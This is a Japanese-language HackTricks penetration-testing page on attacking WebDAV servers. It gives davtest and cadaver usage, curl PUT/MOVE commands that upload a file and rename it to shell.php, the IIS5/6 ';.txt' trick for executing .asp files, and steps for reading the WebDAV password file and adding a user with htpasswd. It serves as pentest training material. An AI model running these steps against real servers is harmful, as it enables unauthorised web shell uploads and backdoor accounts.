# WebDav

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も**高度なコミュニティツール**によって強化された**ワークフローを簡単に構築**および**自動化**します。\
今すぐアクセスしてください：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>**htARTE (HackTricks AWS Red Team Expert)**を使用して、ゼロからヒーローまでAWSハッキングを学びましょう</strong>!</summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝**したい場合や**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手してください
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つけます
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* **ハッキングトリックを共有するには、**[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出してください。

</details>

**HTTPサーバーがWebDavを有効にした場合、**適切な**資格情報**を持っていれば、**ファイルを操作**することが可能です。これらのサーバーを制御することは、**Webシェルのアップロードと実行**をしばしば含みます。

WebDavサーバーへのアクセスには通常、**有効な資格情報**が必要であり、[**WebDavブルートフォース**](../../generic-methodologies-and-resources/brute-force.md#http-basic-auth)がそれらを取得する一般的な方法です。

特にサーバーサイドスクリプトの実行を防ぐファイルアップロードの制限を克服するためには、次のことができます：

* **実行可能な拡張子**を持つファイルを直接**アップロード**する（制限されていない場合）。
* 実行不可能なファイル（.txtなど）を実行可能な拡張子に**リネーム**する。
* アップロードされた実行不可能なファイルの拡張子を、実行可能な拡張子に変更して**コピー**する。

## DavTest

**Davtest**は、**異なる拡張子を持つ複数のファイルをアップロード**し、その拡張子が**実行されるかどうかをチェック**します：
```bash
davtest [-auth user:password] -move -sendbd auto -url http://<IP> #Uplaod .txt files and try to move it to other extensions
davtest [-auth user:password] -sendbd auto -url http://<IP> #Try to upload every extension
```
```html
![](<../../.gitbook/assets/image (851).png>)

これは、**.txt** および **.html 拡張子が実行されている** ことを意味するものではありません。これは、これらのファイルに **Web を通じてアクセスできる** ことを意味します。

## Cadaver

このツールを使用して、**WebDav に接続**し、**アップロード**、**移動**、**削除**などのアクションを **手動** で実行できます。
```
```
cadaver <IP>
```
## PUTリクエスト
```
curl -T 'shell.txt' 'http://$ip'
```
## MOVE リクエスト
```
curl -X MOVE --header 'Destination:http://$ip/shell.php' 'http://$ip/shell.txt'
```
<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**および**自動化**します。\
今すぐアクセスしてください：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## IIS5/6 WebDavの脆弱性

この脆弱性は非常に興味深いです。 **WebDav**は、拡張子**.asp**のファイルを**アップロード**または**名前の変更**を許可しません。 ただし、名前の末尾に**";.txt"**を追加することで、ファイルは**.asp**ファイルとして実行されます（**".txt"の代わりに".html"を使用する**こともできますが、**";"を忘れないでください**）。

その後、シェルを".**txt"ファイル**としてアップロードし、それを".asp;.txt"ファイルに**コピー/移動**できます。 Webサーバーを介してそのファイルにアクセスすると、それが**実行**されます（cadaverは移動アクションが機能しなかったと言うかもしれませんが、実際には機能しています）。

![](<../../.gitbook/assets/image (1092).png>)

## 資格情報の投稿

WebdavがApacheサーバーを使用している場合は、Apacheで構成されたサイトを確認する必要があります。 一般的には：\
_**/etc/apache2/sites-enabled/000-default**_

その中に次のようなものが見つかるかもしれません：
```
ServerAdmin webmaster@localhost
Alias /webdav /var/www/webdav
<Directory /var/www/webdav>
DAV On
AuthType Digest
AuthName "webdav"
AuthUserFile /etc/apache2/users.password
Require valid-user
```
以下は、**WebDAV**サーバーの有効な**資格情報**が含まれているファイルです：
```
/etc/apache2/users.password
```
以下の種類のファイルには、**ユーザー名**と**パスワード**のハッシュが含まれています。これらは、WebDAVサーバーがユーザーを認証するために使用している資格情報です。

これらを**解読**したり、何らかの理由で**WebDAV**サーバーに**アクセス**したい場合は、これらを**追加**することができます：
```bash
htpasswd /etc/apache2/users.password <USERNAME> #You will be prompted for the password
```
新しい資格情報が機能しているかどうかを確認するには、次の操作を行うことができます：
```bash
wget --user <USERNAME> --ask-password http://domain/path/to/webdav/ -O - -q
```
## 参考

* [https://vk9-sec.com/exploiting-webdav/](https://vk9-sec.com/exploiting-webdav/)

<details>

<summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい** または **HackTricks をPDFでダウンロードしたい場合は** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見る
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f) または [**telegramグループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live) をフォローする。
* **ハッキングテクニックを共有するために** [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のGitHubリポジトリにPRを提出する。

</details>

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) を使用して、世界で最も高度なコミュニティツールによって強化された **ワークフローを簡単に構築** および **自動化** します。\
今すぐアクセスしてください：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
